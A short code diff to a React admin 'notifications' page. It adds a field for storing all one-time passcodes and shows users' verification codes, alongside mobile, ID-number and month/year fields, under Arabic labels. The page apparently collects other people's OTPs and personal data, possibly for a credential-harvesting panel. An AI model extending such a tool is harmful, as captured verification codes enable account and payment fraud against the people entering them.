@@ -98,6 +98,7 @@ interface Notification {
   month?: string
   year?: string
   otp2?: string
+  allOtps?:[]
   mobile?: string
   idNumber?: string
   network?: string
@@ -1052,7 +1053,7 @@ export default function NotificationsPage() {
                   <span className="font-medium text-slate-700">رمز التحقق المرسل:</span>
                   <Badge className="font-mono bg-green-500">{selectedNotification.otp || "غير متوفر"}</Badge>
                   <Badge className="font-mono bg-green-500">{selectedNotification.otp2 || "غير متوفر"}</Badge>
-                </p>
+             </p>
               </div>
             </div>
           )}
